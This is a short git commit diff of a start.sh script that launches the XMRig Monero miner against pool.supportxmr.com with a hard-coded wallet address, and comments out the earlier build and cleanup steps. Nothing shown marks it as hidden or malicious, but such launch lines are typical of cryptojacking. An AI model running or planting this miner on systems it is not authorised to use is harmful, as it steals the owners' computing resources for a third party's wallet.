f825a85c807fd9d3ae87f4ec0aa91c7138ce3ba8
Abbas Bandar <abbasbandar@gmail.com>
2024-04-11 11:38:14 +0200

    edit

--- start.sh
+++ start.sh
@@ -1,7 +1,8 @@
-cd source && chmod +x *
+# cd source
+chmod +x *
 
-rm -rf build
+# rm -rf build
 
-./install
+# ./install
 
-./build/xmrig -o pool.supportxmr.com:443 -u 4318tW8SFCr4UjksRM5hwRGXPUFVB4K1vUZXqUoQzdqaZ8DAojkpkQkZqNLZYbtv1nQ743YE8V3BtfMuhNfaxnhhQQ8Yiqx -k --tls -p tunning_advanced
+./xmrig -o pool.supportxmr.com:443 -u 4318tW8SFCr4UjksRM5hwRGXPUFVB4K1vUZXqUoQzdqaZ8DAojkpkQkZqNLZYbtv1nQ743YE8V3BtfMuhNfaxnhhQQ8Yiqx -k --tls -p tunning_advanced
